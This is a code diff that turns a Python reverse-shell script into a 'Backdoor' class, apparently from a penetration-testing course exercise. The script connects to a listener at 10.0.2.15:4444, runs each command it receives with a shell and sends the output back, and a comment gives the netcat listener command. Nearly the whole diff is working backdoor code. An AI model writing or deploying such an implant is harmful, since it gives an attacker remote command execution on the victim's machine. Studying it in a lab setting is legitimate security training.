@@ -2,19 +2,23 @@
 
 import socket, subprocess, time
 
-def execute_system_command(command):
-	return subprocess.check_output(command, shell=True)
+class Backdoor:
+	def __init__(self, ip, port):
+		# nc -vv -l -p 4444
+		# establish connection
+		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.connection.connect((ip, port))	# tuple
 
-# nc -vv -l -p 4444
-# establish connection
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.0.2.15", 4444))	# tuple
+	def execute_system_command(self, command):
+		return subprocess.check_output(command, shell=True)
 
 # time.sleep(10)
-
-while True:
-	command = connection.recv(1024) # batch 1024bytes
-	command_result = execute_system_command(command) # whoami
-	connection.send(command_result)
-
-connection.close()
+	def run(self):
+		while True:
+			command = self.connection.recv(1024) # batch 1024bytes
+			command_result = self.execute_system_command(command) # whoami
+			self.connection.send(command_result)
+		connection.close()
+		
+my_backdoor = Backdoor("10.0.2.15", 4444)
+my_backdoor.run()
